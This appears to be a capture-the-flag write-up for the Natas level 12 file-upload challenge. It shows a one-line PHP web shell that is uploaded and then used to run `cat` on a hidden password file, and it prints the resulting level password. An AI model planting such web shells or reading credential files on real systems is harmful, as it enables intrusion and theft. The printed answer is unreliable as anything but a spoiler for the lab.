# LV12 📤 File Upload Exploit  

When accessing the challenge, the page displayed a **title** along with two buttons:  
**"choose file"** and **"upload file"**.  
<img width="1920" height="467" alt="image" src="https://github.com/user-attachments/assets/632d3b1e-de7b-4465-a567-d3c18de2e406" />  

👉 Clicking **View Source Code**, I found the backend logic of the webpage:  
<img width="1398" height="981" alt="image" src="https://github.com/user-attachments/assets/befd7529-c2a0-4edd-96ec-9c69751cd0ac" />  
<img width="962" height="363" alt="image" src="https://github.com/user-attachments/assets/07ca0e97-cf70-4055-ac28-aa084268b365" />  

From the code, it was clear that the site allows **file uploads**, with a size restriction of **≤ 1KB**.  

---

## 🔎 Exploitation  

1. **Test uploading a `.php` file**  
   <img width="1920" height="528" alt="image" src="https://github.com/user-attachments/assets/304bb1d1-2f23-4634-8ba3-2e1d9541385f" />  

   Using Burp Suite to intercept the request:  
   <img width="1485" height="534" alt="image" src="https://github.com/user-attachments/assets/8ca4da5a-4063-4450-b0a1-2e30ea1243cf" />  

   The file was uploaded, but the server renamed it with a **`.jpg`** extension.  

---

2. **Bypass by uploading PHP code**  
   I modified the file contents to:  

   ```php
   <?php echo system($_GET['cmd']); ?>
Then uploaded it again.

Remote command execution
After upload, I navigated to the uploaded file and appended a command parameter:

upload/nguyen.php?cmd=cat /etc/natas_webpass/natas13


This executed the cat command on the hidden password file.

✨ Result

The password for Natas13 appeared:

```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```
